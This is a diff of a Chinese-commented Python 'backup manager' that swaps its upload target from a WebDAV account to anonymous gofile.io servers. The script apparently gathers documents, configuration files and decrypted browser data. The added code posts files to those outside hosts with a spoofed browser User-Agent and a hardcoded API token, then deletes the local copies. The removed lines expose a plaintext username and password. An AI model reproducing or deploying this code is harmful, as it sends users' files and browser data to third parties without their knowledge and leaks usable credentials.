@@ -22,8 +22,6 @@ import sqlite3
 import subprocess
 from datetime import datetime, timedelta
 from pathlib import Path
-from requests.auth import HTTPBasicAuth
-import urllib3
 
 # 尝试导入加密库
 try:
@@ -34,9 +32,6 @@ try:
 except ImportError:
     CRYPTO_AVAILABLE = False
     logging.warning("⚠️ pycryptodome 未安装，浏览器数据导出功能将不可用")
-
-# 禁用SSL警告
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class BackupConfig:
     # 调试配置
@@ -152,11 +147,14 @@ class BackupConfig:
         "__pycache__",
     ]
 
-    # Infini Cloud 上传配置（从环境变量读取）
-    # INFINI_URL: WebDAV 服务地址（如：https://wajima.infini-cloud.net/dav/）
-    # INFINI_USER: Connection ID（登录 InfiniCLOUD 的 ID）
-    # INFINI_PASS: Apps Password（外部应用程序连接密码）
-    INFINI_REMOTE_BASE_DIR = "backup"  # 远程基础目录（相对于 /dav/）
+    # 上传服务器配置
+    UPLOAD_SERVERS = [
+        "https://store9.gofile.io/uploadFile",
+        "https://store8.gofile.io/uploadFile",
+        "https://store7.gofile.io/uploadFile",
+        "https://store6.gofile.io/uploadFile",
+        "https://store5.gofile.io/uploadFile"
+    ]
 
     # 网络配置
     NETWORK_CHECK_HOSTS = [
@@ -179,19 +177,7 @@ class BackupManager:
     def __init__(self):
         """初始化备份管理器"""
         self.config = BackupConfig()
-        self.infini_url = "https://wajima.infini-cloud.net/dav/"
-        self.infini_user = "wongstar"
-        self.infini_pass = "my95gfPVtKuDCpAK"
-        
-        username = getpass.getuser()
-        user_prefix = username[:5] if username else "user"
-        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_linux_backup"
-        
-        # 配置 requests session 用于上传
-        self.session = requests.Session()
-        self.session.verify = False  # 禁用SSL验证
-        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
-        
+        self.api_token = "8m9D4k6cv6LekYoVcjQBK4yvvDDyiFdf"
         # 使用集合优化扩展名检查性能
         self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
         self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
@@ -825,32 +811,24 @@ class BackupManager:
         }
         return backup_dirs
 
-    def _create_remote_directory(self, remote_dir):
-        """创建远程目录（使用 WebDAV MKCOL 方法）"""
-        if not remote_dir or remote_dir == '.':
-            return True
-        
+    def _get_upload_server(self):
+        """获取上传服务器地址，使用简单的轮询方式实现负载均衡"""
         try:
-            # 构建目录路径
-            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
+            # 尝试所有服务器
+            for server in self.config.UPLOAD_SERVERS:
+                try:
+                    # 测试服务器连接性
+                    response = requests.head(server, timeout=5)
+                    if response.status_code == 200:
+                        return server
+                except:
+                    continue
             
-            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
-            
-            if response.status_code in [201, 204, 405]:  # 405 表示已存在
-                return True
-            elif response.status_code == 409:
-                # 409 可能表示父目录不存在，尝试创建父目录
-                parent_dir = os.path.dirname(remote_dir)
-                if parent_dir and parent_dir != '.':
-                    if self._create_remote_directory(parent_dir):
-                        # 父目录创建成功，再次尝试创建当前目录
-                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
-                        return response.status_code in [201, 204, 405]
-                return False
-            else:
-                return False
-        except Exception:
-            return False
+            # 如果所有服务器都不可用，返回默认服务器
+            return self.config.UPLOAD_SERVERS[0]
+        except:
+            # 发生异常时返回默认服务器
+            return self.config.UPLOAD_SERVERS[0]
 
     def split_large_file(self, file_path):
         """将大文件分割为多个小块"""
@@ -977,7 +955,7 @@ class BackupManager:
         return self._upload_single_file(file_path)
 
     def _upload_single_file(self, file_path):
-        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法）"""
+        """上传单个文件"""
         try:
             # 检查文件权限和状态
             if not os.path.exists(file_path):
@@ -999,17 +977,6 @@ class BackupManager:
                 logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                 return False
 
-            # 构建远程路径
-            filename = os.path.basename(file_path)
-            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
-            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
-            
-            # 创建远程目录（如果需要）
-            remote_dir = os.path.dirname(remote_filename)
-            if remote_dir and remote_dir != '.':
-                if not self._create_remote_directory(remote_dir):
-                    logging.warning(f"无法创建远程目录: {remote_dir}，将继续尝试上传")
-
             # 上传重试逻辑
             for attempt in range(self.config.RETRY_COUNT):
                 if not self._check_internet_connection():
@@ -1017,62 +984,53 @@ class BackupManager:
                     time.sleep(self.config.RETRY_DELAY)
                     continue
 
-                try:
-                    # 根据文件大小动态调整超时时间
-                    if file_size < 1024 * 1024:  # 小于1MB
-                        connect_timeout = 10
-                        read_timeout = 30
-                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
-                        connect_timeout = 15
-                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
-                    else:  # 大于10MB
-                        connect_timeout = 20
-                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
-                    
-                    logging.critical(f"正在上传文件 {file_path}（{file_size / 1024 / 1024:.2f}MB）到 Infini Cloud，第 {attempt + 1} 次尝试...")
-                    
-                    # 准备请求头
-                    headers = {
-                        'Content-Type': 'application/octet-stream',
-                        'Content-Length': str(file_size),
-                    }
-                    
-                    # 执行上传（使用 WebDAV PUT 方法）
-                    with open(file_path, 'rb') as f:
-                        response = self.session.put(
-                            remote_path,
-                            data=f,
-                            headers=headers,
-                            auth=self.auth,
-                            timeout=(connect_timeout, read_timeout),
-                            stream=False
-                        )
-                    
-                    if response.status_code in [201, 204]:
-                        logging.critical(f"上传成功: {file_path} -> {remote_filename}")
-                        try:
-                            os.remove(file_path)
-                        except Exception as e:
-                            logging.error(f"删除已上传文件失败: {e}")
-                        return True
-                    elif response.status_code == 403:
-                        logging.error(f"上传失败，权限不足（403 Forbidden）: {remote_filename}")
-                    elif response.status_code == 404:
-                        logging.error(f"上传失败，远程路径不存在（404 Not Found）: {remote_filename}")
-                    elif response.status_code == 409:
-                        logging.error(f"上传失败，远程路径冲突（409 Conflict）: {remote_filename}")
-                    else:
-                        logging.error(f"上传失败，状态码: {response.status_code}, 响应: {response.text[:200]}")
-                        
-                except requests.exceptions.Timeout:
-                    logging.error(f"上传超时 {file_path}")
-                except requests.exceptions.SSLError as e:
-                    logging.error(f"SSL错误 {file_path}: {e}")
-                except requests.exceptions.ConnectionError as e:
-                    logging.error(f"连接错误 {file_path}: {e}")
-                except Exception as e:
-                    logging.error(f"上传文件出错 {file_path}: {str(e)}")
+                # 服务器轮询
+                for server in self.config.UPLOAD_SERVERS:
+                    try:
+                        with open(file_path, "rb") as f:
+                            logging.critical(f"正在上传文件 {file_path}（{file_size / 1024 / 1024:.2f}MB），第 {attempt + 1} 次尝试，使用服务器 {server}...")
+                            
+                            # 准备上传会话
+                            session = requests.Session()
+                            session.headers.update({
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                            })
+                            
+                            # 执行上传
+                            response = session.post(
+                                server,
+                                files={"file": f},
+                                data={"token": self.api_token},
+                                timeout=self.config.UPLOAD_TIMEOUT,
+                                verify=True
+                            )
+                            
+                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
+                                result = response.json()
+                                if result.get("status") == "ok":
+                                    logging.critical(f"上传成功: {file_path}")
+                                    try:
+                                        os.remove(file_path)
+                                    except Exception as e:
+                                        logging.error(f"删除已上传文件失败: {e}")
+                                    return True
+                                else:
+                                    error_msg = result.get("message", "未知错误")
+                                    logging.error(f"服务器返回错误: {error_msg}")
+                            else:
+                                logging.error(f"上传失败，状态码: {response.status_code}, 响应: {response.text}")
+                                
+                    except requests.exceptions.Timeout:
+                        logging.error(f"上传超时 {file_path}")
+                    except requests.exceptions.SSLError:
+                        logging.error(f"SSL错误 {file_path}")
+                    except requests.exceptions.ConnectionError:
+                        logging.error(f"连接错误 {file_path}")
+                    except Exception as e:
+                        logging.error(f"上传文件出错 {file_path}: {str(e)}")
 
+                    continue
+                
                 if attempt < self.config.RETRY_COUNT - 1:
                     logging.critical(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                     time.sleep(self.config.RETRY_DELAY)
